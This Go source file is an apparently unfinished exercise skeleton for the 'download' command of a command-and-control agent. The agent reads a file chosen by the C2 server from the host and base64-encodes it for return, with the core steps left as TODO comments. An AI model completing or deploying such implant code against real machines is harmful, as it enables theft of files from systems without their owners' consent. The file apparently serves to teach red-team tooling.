package agent

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"

	"c2framework/internals/control"
	"c2framework/internals/models"
	"c2framework/internals/server"
)

// orchestrateDownload is the orchestrator for the "download" command
func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal the arguments
	var downloadArgs control.DownloadArgs
	if err := json.Unmarshal(job.Arguments, &downloadArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "failed to unmarshal DownloadArgs",
		}
	}

	log.Printf("|DOWNLOAD ORCHESTRATOR| Task ID: %s. Downloading file: %s",
		job.JobID, downloadArgs.FilePath)

	// Agent-side validation
	if downloadArgs.FilePath == "" {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Task ID %s: FilePath is empty.", job.JobID)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "FilePath cannot be empty",
		}
	}

	// Call the doer
	// TODO: call the doer doDownload(), downloadArgs.FilePath as arg, return value called result

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Download failed for TaskID %s: %s",
			job.JobID, result.ErrorMsg)
		finalResult.Error = result.ErrorMsg
		finalResult.Success = false
	} else {
		log.Printf("|DOWNLOAD SUCCESS| Downloaded %d bytes from %s for TaskID %s",
			result.FileSize, downloadArgs.FilePath, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}

// doDownload performs the actual file reading
func doDownload(filePath string) models.DownloadResult {
	result := models.DownloadResult{
		FilePath: filePath,
	}

	// NOTE - we use os library, handles cross-platform HENCE NO NEED FOR INTERFACE!
	// Check if file exists
	// TODO: call os.Stat with filePath as arg, return value as fileInfo
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
		return result
	}

	// Check if it's a regular file (not directory)
	// TODO: Call IsDir() on fileInfo, return error if it is

	// Capture fileSize (for validation back on server side)
	result.FileSize = fileInfo.Size()

	// Read the file
	// TODO: call os.Open() to open the file, return as file
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to open file: %v", err)
		return result
	}
	defer file.Close()

	// TODO: call io.ReadAll() to load the actual file bytes into memory
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to read file: %v", err)
		return result
	}

	// Encode to base64 for safe JSON transmission
	// TODO: Call base64.StdEncoding.EncodeToString() to encode fileBytes into b64
	result.Success = true

	log.Printf("|DOWNLOAD DOER| Read %d bytes from %s", len(fileBytes), filePath)
	return result
}
